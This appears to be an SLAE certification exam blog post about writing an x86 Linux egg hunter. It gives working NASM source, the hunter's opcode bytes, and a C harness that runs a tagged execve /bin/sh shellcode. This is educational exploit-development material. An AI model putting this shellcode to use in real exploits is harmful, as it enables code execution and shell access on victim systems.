---
title: "SLAE x86 Exam - Assignment #3"
date: 2021-12-21
toc: true
search: false
classes: wide
categories:
  - blog
tags:
  - slae
  - assembly
  - nasm
  - c
  - egghunter
  - shellcode
  - exam
  - shellcode
---

## Disclaimer

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:

<https://www.pentesteracademy.com/course?id=3>

Student ID: PA-30398

## Foreword

The 3rd assignment requires you to write shellcode for an `Egg Hunter`. Moreover, it should be *configurable for different payloads*.

## Source code

THe source code for this assignment can be found [here](https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/3).

Follows the list of files:

- [egg_hunter.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/3/egg_hunter.nasm), the Assembly code of the egg-hunter
- [test_egg_hunter.c](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/3/test_egg_hunter.c), a C program written for testing the egg-hunter with the `execve` shellcode

## Theory

Now comes the question: what is an *Egg Hunter*?

According to a [paper](https://www.exploit-db.com/docs/english/18482-egg-hunter---a-twist-in-buffer-overflow.pdf) from `Exploit-DB`:

> When the "Egg hunter" shellcode is executed, it searches for the unique "tag" that was prefixed with the large payload and starts the execution of the payload.
> [...]
> The Egg hunting technique is used when there are not enough available consecutive memory locations to insert the shellcode. Instead, a unique "tag" is prefixed with shellcode.

## Practice

### Implementation

Given I had zero experience with `egg hunters`, I tried to search for documents detailing how to create this type of shellcode.

I stumbled on this particular document - [Safely Searching Process Virtual Address Space](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) - which shows some techniques you can employ for your own implementation.

Since the `SIGSEGV handler technique` is considered *infeasible*, mainly due to its size, I decided to try using the **system call technique**.

The system call I chose to use is [chdir()](https://man7.org/linux/man-pages/man2/chdir.2.html). Follows its prototype:

```cpp
#include <unistd.h>

int chdir(const char *path);
```

All it does is try to change the **Current Working Directory** (`CWD`) to the path pointed to the argument `path` (which is a pointer).

Since it accepts a pointer, we can use it to test memory addresses. Given the function already implements a `SIGSEGV handler`, it doesn't throw a SIGSEGV error, crashing the program.

Instead, it returns the error **0xfffffff2** (`EFAULT`), indicating that a bad address was passed to the function.

Follows my implementation in Assembly language:

```nasm
; Author: Robert C. Raducioiu (rbct)

global _start

section .text

_start:

    ; clear registers for later use
    xor ebx, ebx
    mul ebx

; This routine checks loops over memory addresses, checking if they are valid
; If the address is valid the shellcode continues to CheckBytes
CheckAddress:

    ; increment memory address by 1 (or use "add ebx, 4" if
    ;   you're sure about the offset)
    inc ebx

    ; call chdir(EBX)
    xor eax, eax
    mov al, 12
    int 0x80

    ; if the return value is 0xfffffff2 (EFAULT), go back to CheckAddress,
    ;   otherwise continue to CheckBytes
    cmp al, 0xf2
    jz CheckAddress

; This routine checks the 4 bytes stored at the address validated by
;   Checkaddress. The goal is to find the Egg Hunter Tag, in this case "rbct"
CheckBytes:

    ; load the 4 bytes from the memory address we're checking
    mov edx, DWORD[ebx]

    ; string "rbcs"
    mov esi, 0x72626373
    
    ; increment esi, thus: "rbct"
    inc esi

    ; check if the 4 bytes are equal to the flag, otherwise
    ;   check the next 4 bytes
    cmp edx, esi
    jnz CheckAddress

    ; if the two DWORDs are equal, then increment the address by 4, and
    ;   execute the shellcode
    add ebx, 4
    call ebx

```

### Testing

I've tested this egg-hunter above with the `exit shellcode`. To do this, I've appended the following Assembly code at the end of the previous file:

```nasm
section .data

    shellcode: db 0x74, 0x63, 0x62, 0x72, 0x31, 0xc0, 0x40, 0xcd, 0x80
```

After running it, I've confirmed it works correctly:

```bash
# assembling
nasm -f elf32 egg_hunter.nasm

# linking
#   also set the stack as executable (for the exit shellcode)
ld -N -o egg_hunter egg_hunter.o

./egg_hunter

```

Instead of throwing a `SIGSEGV` error, it ran the exit shellcode successfully.

Next, I decided to try it with the `execve-stack shellcode`:

```cpp
#include <stdio.h>
#include <string.h>

// tag "rbct" prepended to the shellcode
unsigned char shellcode[] = "\x74\x63\x62\x72\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80";

// egg-hunter shellcode
unsigned char egghunter[] = "\x31\xdb\xf7\xe3\x43\x31\xc0\xb0\x0c\xcd\x80\x3c\xf2\x74\xf5\x8b\x13\xbe\x73\x63\x62\x72\x46\x39\xf2\x75\xe9\x83\xc3\x04\xff\xd3";

main() {
    printf("[+] Shellcode length: %d\n", strlen(shellcode));
    printf("[+] Egg-hunter length: %d\n", strlen(egghunter));

    // run the egg-hunter shellcode
    int (*ret)() = (int(*)())egghunter;
    ret();
}
```

I saved the `execve` shellcode inside an array named `shellcode`, while storing the egg-hunter shellcode inside the array `egghunter`.

Inside the `main` function, the programs prints the length of the two shellcodes, and finally executes the egg-hunter shellcode. It does so by getting the pointer of the latter, and turning it into a function.

Follows a screenshot demostrating the successful execution of the program:

![Egg-hunter found and executed the execve shellcode](/assets/img/slae32/egg_hunter_shellcode_proof.png)
*Egg-hunter found and executed the execve shellcode*
